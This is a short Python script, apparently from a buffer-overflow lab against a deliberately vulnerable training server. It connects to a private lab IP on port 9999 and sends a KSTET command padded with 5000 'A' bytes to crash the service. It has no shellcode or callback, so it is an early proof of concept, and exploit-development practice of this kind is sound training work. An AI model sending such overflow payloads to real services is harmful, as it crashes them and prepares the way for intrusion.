#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import exit

verbose = False
rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

buff = "A" *  5000

if __name__ == '__main__':
    print('[+] creating payload')
    payload = "KSTET /.:/{buff}\r\n".format(buff=buff)
    if verbose:
        print('[*] payload:\n\t{payload}'.format(payload=payload))
    print('[+] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    print('[+] checking for welcome message')
    msg = s.recv(1024)
    print('[+] received welcome message')
    if verbose:
        print('[*] welcome message: {msg}'.format(msg=msg))
    print('[+] sending payload')
    s.send(payload)
    print('[+] payload sent, cleaning up')
    s.close()

